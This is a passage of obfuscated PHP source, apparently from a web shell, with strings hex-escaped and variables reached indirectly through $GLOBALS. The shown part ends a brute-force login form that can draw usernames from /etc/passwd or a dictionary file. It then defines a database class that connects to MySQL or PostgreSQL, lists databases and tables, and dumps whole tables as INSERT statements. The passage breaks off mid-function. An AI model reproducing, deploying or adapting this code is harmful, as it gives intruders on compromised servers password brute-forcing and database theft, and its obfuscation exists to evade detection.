x61\x6e>\x53e\x72\x76\x65\x72:\x70ort\x3c/s\x70\x61\x6e\x3e</\x74d>"."<t\x64>\x3c\x69\x6eput\x20typ\x65\x3dt\x65\x78t\x20na\x6d\x65=se\x72\x76\x65r \x76al\x75e\x3d\x221\x32\x37.0\x2e0.\x31\x22>\x3c/td\x3e\x3c/tr\x3e"."<\x74\x72>\x3c\x74\x64\x3e<sp\x61\x6e>Br\x75\x74e t\x79pe</sp\x61\x6e></\x74d\x3e"."\x3ctd\x3e<\x6c\x61\x62\x65l><i\x6e\x70u\x74\x20\x74y\x70\x65\x3drad\x69\x6f na\x6de\x3dt\x79p\x65\x20\x76alu\x65\x3d\x221\x22\x20\x63\x68\x65\x63\x6bed>\x20/\x65\x74\x63/p\x61ss\x77d</\x6cab\x65\x6c>\x3c/t\x64>\x3c/t\x72\x3e"."\x3c\x74\x72><\x74d>\x3c/\x74d>\x3ctd\x3e<\x6c\x61\x62e\x6c \x73t\x79le\x3d\x22pa\x64\x64i\x6eg-\x6c\x65\x66t:15px\"\x3e\x3ci\x6e\x70ut t\x79\x70e=chec\x6bb\x6fx\x20n\x61\x6d\x65\x3drev\x65\x72se\x20\x76al\x75e\x3d\x31\x20\x63\x68\x65\x63\x6bed> \x72e\x76e\x72se\x20(log\x69n -\x3e\x20\x6e\x69\x67\x6f\x6c)</\x6ca\x62\x65l>\x3c/\x74\x64\x3e\x3c/t\x72>"."\x3ct\x72><t\x64\x3e</\x74\x64\x3e\x3c\x74\x64\x3e<\x6ca\x62el>\x3cinpu\x74\x20t\x79\x70e=r\x61\x64io n\x61me\x3dt\x79\x70\x65\x20v\x61\x6c\x75\x65\x3d\x22\x32\x22>\x20\x44ict\x69ona\x72y</\x6ca\x62e\x6c>\x3c/td\x3e\x3c/tr\x3e"."<\x74r\x3e\x3ctd>\x3c/\x74d>\x3ct\x64><\x74\x61\x62l\x65 \x73ty\x6c\x65=\x22\x70\x61dding-l\x65f\x74:1\x35px\x22\x3e<\x74r\x3e<\x74d><s\x70a\x6e\x3eLo\x67\x69n</\x73\x70a\x6e></td>"."\x3ctd\x3e\x3cin\x70ut\x20type\x3d\x74\x65\x78t\x20\x6ea\x6d\x65=\x6c\x6f\x67in \x76al\x75\x65\x3d\x22ro\x6ft\x22>\x3c/td\x3e\x3c/t\x72\x3e"."\x3ct\x72\x3e<\x74\x64><\x73\x70\x61n>D\x69c\x74i\x6f\x6e\x61ry</\x73\x70\x61n></t\x64\x3e"."<\x74d\x3e<in\x70ut t\x79\x70e=\x74ex\x74 n\x61me=di\x63t v\x61\x6cue\x3d\x22".htmlspecialchars($GLOBALS["cw\x64"])."pas\x73\x77d\x2ed\x69c\x22></\x74\x64\x3e</tr\x3e\x3c/\x74a\x62l\x65>"."</t\x64\x3e\x3c/tr\x3e<tr><td\x3e\x3c/t\x64><\x74d\x3e<in\x70ut\x20\x74y\x70e\x3dsub\x6d\x69\x74 \x76\x61l\x75e\x3d\x22>\x3e\">\x3c/td></t\x72>\x3c/for\x6d\x3e</tab\x6ce>";echo"\x3c/div><b\x72\x3e";printFooter();}function actionSql(){class DbClass{var$type;var$link;var$res;function DbClass($type){$this->type=${${"\x47\x4c\x4f\x42\x41\x4cS"}["q\x6a\x63hi\x73q\x78\x70p"]};}function connect($host,$user,$pass,$dbname){${"\x47\x4c\x4f\x42A\x4c\x53"}["h\x77d\x6e\x65ky\x69\x6f"]="us\x65r";switch($this->type){case"my\x73ql":if($this->link=@mysql_connect($host,${${"GLO\x42\x41\x4cS"}["\x68\x77d\x6e\x65ky\x69o"]},${${"G\x4cO\x42\x41LS"}["a\x64\x6a\x77\x6a\x67o"]},true))return true;break;case"\x70\x67s\x71\x6c":$host=explode(":",$host);if(!$host[1])$host[1]=5432;if($this->link=@pg_connect("\x68\x6f\x73t={$host[0]}\x20\x70ort\x3d{$host[1]} use\x72=$user\x20\x70\x61\x73\x73\x77\x6f\x72d=$pass\x20\x64b\x6e\x61m\x65=$dbname"))return true;break;}return false;}function selectdb($db){switch($this->type){case"\x6d\x79\x73\x71\x6c":if(@mysql_select_db(${${"GLOB\x41\x4c\x53"}["\x61\x79x\x75\x71\x69\x65\x74"]}))return true;break;}return false;}function query($str){switch($this->type){case"\x6d\x79\x73q\x6c":return$this->res=@mysql_query(${${"\x47L\x4f\x42AL\x53"}["\x6b\x76abp\x6ft\x76e\x65\x69"]});break;case"\x70\x67s\x71l":return$this->res=@pg_query($this->link,${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x6b\x76\x61\x62p\x6f\x74\x76e\x65\x69"]});break;}return false;}function fetch(){${"G\x4c\x4f\x42ALS"}["o\x65y\x6f\x6ekn\x63"]="\x72\x65\x73";${"\x47LOB\x41LS"}["ae\x76l\x67\x67\x66hyc"]="\x72\x65\x73";${${"\x47\x4cOBA\x4c\x53"}["\x61\x65\x76\x6cg\x67fh\x79\x63"]}=func_num_args()?func_get_arg(0):$this->res;switch($this->type){case"m\x79sql":return@mysql_fetch_assoc(${${"G\x4c\x4fB\x41\x4cS"}["\x6f\x65\x79\x6fn\x6bn\x63"]});break;case"p\x67\x73\x71\x6c":return@pg_fetch_assoc(${${"\x47L\x4fB\x41L\x53"}["\x7ao\x7a\x63\x76\x6c"]});break;}return false;}function listDbs(){switch($this->type){case"m\x79s\x71l":return$this->res=@mysql_list_dbs($this->link);break;case"\x70gsql":return$this->res=$this->query("S\x45L\x45\x43T d\x61tn\x61\x6de\x20\x46R\x4fM \x70\x67\x5f\x64\x61\x74ab\x61s\x65");break;}return false;}function listTables(){switch($this->type){case"\x6dysql":return$this->res=$this->query("S\x48OW \x54\x41\x42\x4cES");break;case"\x70g\x73q\x6c":return$this->res=$this->query("sel\x65ct\x20\x74\x61b\x6c\x65_\x6eame\x20f\x72\x6f\x6d in\x66\x6fr\x6dati\x6fn_s\x63hem\x61\x2etabl\x65\x73 \x77\x68\x65re\x20(\x74\x61bl\x65\x5fsc\x68e\x6da !\x3d \x27inf\x6fr\x6da\x74\x69on_\x73c\x68\x65\x6da\x27\x20A\x4e\x44\x20t\x61\x62\x6c\x65_sc\x68em\x61 !\x3d \x27\x70g_c\x61ta\x6c\x6f\x67') \x6f\x72\x20t\x61b\x6c\x65\x5fnam\x65 = '\x70\x67_u\x73er\x27");break;}return false;}function error(){switch($this->type){case"my\x73ql":return@mysql_error($this->link);break;case"\x70gsql":return@pg_last_error($this->link);break;}return false;}function setCharset($str){${"G\x4c\x4fB\x41\x4cS"}["r\x72\x7a\x69\x6b\x64\x72\x6b\x6c"]="s\x74\x72";$yttobbs="\x73\x74\x72";switch($this->type){case"m\x79\x73\x71l":if(function_exists("mys\x71l\x5fse\x74_\x63hars\x65t"))return@mysql_set_charset(${${"\x47\x4c\x4fBA\x4c\x53"}["\x72\x72zi\x6b\x64r\x6b\x6c"]},$this->link);else$this->query("SE\x54 \x43H\x41RS\x45\x54\x20".${$yttobbs});break;case"m\x79s\x71l":return@pg_set_client_encoding($this->link,${${"GLOBAL\x53"}["\x6b\x76\x61\x62\x70\x6f\x74\x76e\x65\x69"]});break;}return false;}function dump($table){$kratnylmyi="\x74\x61\x62\x6c\x65";$dbtoryldwt="\x69t\x65\x6d";${"\x47\x4c\x4f\x42\x41\x4cS"}["sjc\x6f\x74\x67\x75fu\x74"]="t\x61b\x6c\x65";switch($this->type){case"\x6d\x79\x73q\x6c":${${"\x47L\x4f\x42\x41\x4c\x53"}["\x7ao\x7acvl"]}=$this->query("S\x48OW \x43\x52E\x41T\x45 TAB\x4cE `".${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x66xb\x65o\x67\x63\x6b\x78\x76"]}."`");${${"\x47L\x4fB\x41\x4c\x53"}["\x63\x64x\x6a\x64\x63\x73\x79"]}=mysql_fetch_array(${${"\x47\x4cO\x42\x41\x4c\x53"}["zo\x7a\x63\x76\x6c"]});echo${${"\x47\x4c\x4f\x42\x41L\x53"}["c\x64\x78\x6a\x64c\x73\x79"]}[1].";\n\n";$this->query("\x53E\x4c\x45\x43T * FR\x4f\x4d `".${${"G\x4c\x4f\x42\x41L\x53"}["\x73\x6a\x63\x6f\x74\x67\x75\x66\x75t"]}."`");while(${$dbtoryldwt}=$this->fetch()){${"G\x4cO\x42\x41\x4c\x53"}["\x74w\x71n\x78\x6a\x69\x6a"]="\x74a\x62\x6c\x65";${"GL\x4fBAL\x53"}["\x74\x68p\x70h\x74\x6as\x6d\x69\x63"]="\x76";${${"\x47\x4c\x4fB\x41L\x53"}["\x68af\x6bo\x6fc\x79\x74"]}=array();foreach(${${"G\x4c\x4f\x42\x41\x4cS"}["vj\x79s\x74\x72\x69\x6d\x62bp\x68"]} as${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6e\x64ka\x73w\x63o"]}=>${${"\x47L\x4fB\x41\x4c\x53"}["\x74\x68p\x70\x68tjs\x6d\x69\x63"]}){$wbouipviso="\x63\x6fl\x75\x6dns";${${"G\x4c\x4f\x42A\x4cS"}["v\x6a\x79s\x74\x72i\x6d\x62\x62\x70h"]}[${${"\x47\x4cO\x42A\x4c\x53"}["\x6edk\x61\x73w\x63\x6f"]}]="\x27".@mysql_real_escape_string(${${"\x47\x4c\x4fB\x41L\x53"}["o\x64wo\x79\x74\x6a\x69"]})."'";${$wbouipviso}[]="\x60".${${"\x47\x4c\x4fBA\x4c\x53"}["\x6e\x64\x6b\x61s\x77\x63\x6f"]}."`";}echo"\x49\x4eSE\x52T\x20\x49\x4e\x54\x4f\x20`".${${"\x47\x4c\x4fBA\x4c\x53"}["tw\x71\x6e\x78\x6a\x69\x6a"]}."\x60 (".implode(",\x20",${${"GLO\x42\x41L\x53"}["\x68a\x66\x6bo\x6f\x63\x79\x74"]}).") \x56A\x4c\x55E\x53\x20(".implode(", ",${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x76\x6ays\x74\x72im\x62\x62\x70h"]}).");"."\n";}break;case"\x70\x67\x73\x71\x6c":$this->query("\x53\x45\x4cE\x43\x54 *\x20F\x52\x4f\x4d ".${$kratnylmyi});while(${${"G\x4c\x4f\x42A\x4c\x53"}["\x76\x6a\x79\x73\x74r\x69\x6dbbph"]}=$this->fetch()){$cqlursnfqy="\x69\x74\x65\x6d";$tlofsijxx="\x63o\x6c\x75\x6d\x6e\x73";${${"\x47\x4cO\x42\x41LS"}["\x68\x61\x66\x6bo\x6fc\x79\x74"]}=array();foreach(${$cqlursnfqy} as${${"\x47L\x4f\x42AL\x53"}["\x6ed\x6b\x61\x73w\x63\x6f"]}=>${${"\x47\x4cO\x42\x41\x4c\x53"}["odw\x6f\x79t\x6a\x69"]}){${"\x47\x4c\x4f\x42\x41\x4cS"}["v\x62\x73\x64b\x6bpr\x63f\x6f"]="\x6b";$mmntqvpj="\x6b";${"\x47\x4c\x4f\x42\x41L\x53"}["\x63\x66\x63fnv\x65"]="\x76";${"GL\x4f\x42AL\x53"}["\x72\x77\x74mo\x6d\x69\x6fm"]="it\x65\x6d";${${"G\x4cO\x42A\x4c\x53"}["\x72\x77t\x6d\x6f\x6d\x69\x6fm"]}[${${"\x47\x4c\x4f\x42\x41L\x53"}["v\x62sd\x62\x6b\x70r\x63\x66\x6f"]}]="\x27".addslashes(${${"G\x4cO\x42\x41\x4c\x53"}["\x63\x66\x63\x66n\x76\x65"]})."'";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x68\x61f\x6